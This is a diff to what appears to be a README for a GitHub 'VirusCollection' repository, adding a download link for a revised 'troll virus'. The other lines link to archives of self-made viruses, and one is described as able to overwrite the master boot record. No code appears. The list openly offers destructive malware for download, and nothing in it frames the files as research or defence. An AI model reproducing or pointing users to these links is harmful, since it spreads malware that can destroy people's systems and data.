@@ -18,6 +18,8 @@
 
 * [NANOLOV3YOU.TXT-INFECTION_v3.exe](https://github.com/anonymouschichvy/VirusCollection/blob/main/FILES/NANOLOV3YOU.TXT-INFECTION_v3.zip)-:*This the latest update of V1*
 
+* [UPDATED NANOTROLLVIRUS_v2.1_REV](https://github.com/anonymouschichvy/VirusCollection/blob/main/FILES/REV_NANOTROLLVIRUS.rar)-:*This the latest revise update of troll virus.*
+
 * [NANOTROLLVIRUS_v2](https://github.com/anonymouschichvy/VirusCollection/blob/main/FILES/NANOTROLLVIRUS_v2.zip)-:*This the latest update its a troll virus but it can overwrite the MBR.*
 
 * [NANOLOV3YOUVIRUS_v1](https://github.com/anonymouschichvy/VirusCollection/blob/main/FILES/NANOLOV3YOUVIRUS_v1.zip)-:*This is the first Virus I made.*
